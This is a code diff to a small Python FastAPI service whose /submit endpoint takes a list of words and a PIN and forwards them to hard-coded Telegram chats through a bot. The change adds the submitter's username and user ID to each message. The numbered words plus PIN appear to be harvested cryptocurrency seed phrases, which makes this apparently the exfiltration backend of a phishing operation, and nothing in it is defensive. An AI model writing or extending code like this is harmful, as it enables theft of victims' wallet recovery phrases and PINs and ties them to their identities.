@@ -31,16 +31,18 @@ CHAT_IDS = [7669456027, 7818973762, 7421128257]
 class Data(BaseModel):
     words: List[str]
     pin: str
+    username: str
+    user_id: int
 
 
-def send_to_telegram(words, pin):
+def send_to_telegram(words, pin, username, user_id):
 
-    text = "📥 NEW DATA\n\n"
+    text = f"📥 NEW DATA\n\n👤 User: @{username}\n🆔 ID: {user_id}\n\n"
 
     for i, w in enumerate(words, start=1):
         text += f"{i}. {w}\n"
 
-    text += f"\n🔐PIN: {pin}"
+    text += f"\n🔐 PIN: {pin}"
 
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
@@ -54,9 +56,10 @@ def send_to_telegram(words, pin):
 @app.post("/submit")
 async def submit(data: Data):
 
-    send_to_telegram(data.words, data.pin)
+    send_to_telegram(data.words, data.pin, data.username, data.user_id)
 
     return {"status": "ok"}
+
 
 
 
